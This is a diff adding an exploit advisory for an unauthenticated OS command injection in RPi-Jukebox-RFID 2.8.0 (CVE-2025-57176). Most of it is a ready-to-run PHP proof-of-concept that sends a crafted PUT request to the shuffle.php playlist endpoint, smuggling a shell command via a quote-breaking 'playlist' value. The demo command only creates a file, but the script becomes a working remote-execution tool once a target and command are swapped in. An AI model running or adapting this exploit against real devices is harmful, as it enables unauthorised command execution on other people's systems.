@@ -1,0 +1,58 @@
+=============================================================================================================================================
+| # Title     : RPi-Jukebox-RFID 2.8.0 OS Command Injection                                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/MiczFlor/RPi-Jukebox-RFID                                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214067/ & CVE-2025-57176
+
+[+] Summary    : RPi-Jukebox-RFID version 2.8.0 suffers from an OS command injection vulnerability in the API endpoint:
+                 /phoniebox/api/playlist/shuffle.php
+                 The "playlist" JSON parameter is passed directly into a shell command without proper sanitization or escaping. This allows unauthenticated
+				 remote attackers to execute arbitrary system commands.
+
+[+] POC: A crafted PUT request with a malicious JSON payload allows execution of OS-level commands such as file creation.
+
+         php poc.php 
+
+<?php
+
+
+$target = "http://YOUR-TARGET-IP/phoniebox/api/playlist/shuffle.php";
+
+$injectedCommand = "test';touch indoushka.txt;echo '";
+
+$data = json_encode([
+    "playlist" => $injectedCommand,
+    "shuffle"  => "true"
+]);
+
+$headers = [
+    "Content-Type: application/json",
+    "User-Agent: Mozilla/5.0"
+];
+
+$ch = curl_init($target);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+echo "[+] Sending malicious JSON payload...\n";
+$response = curl_exec($ch);
+
+if ($response === false) {
+    echo "[-] cURL Error: " . curl_error($ch) . "\n";
+} else {
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    echo "[+] HTTP Status Code: {$httpCode}\n";
+    echo "[*] If vulnerable, file 'indoushka.txt' will be created on the server.\n";
+}
+
+curl_close($ch);
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
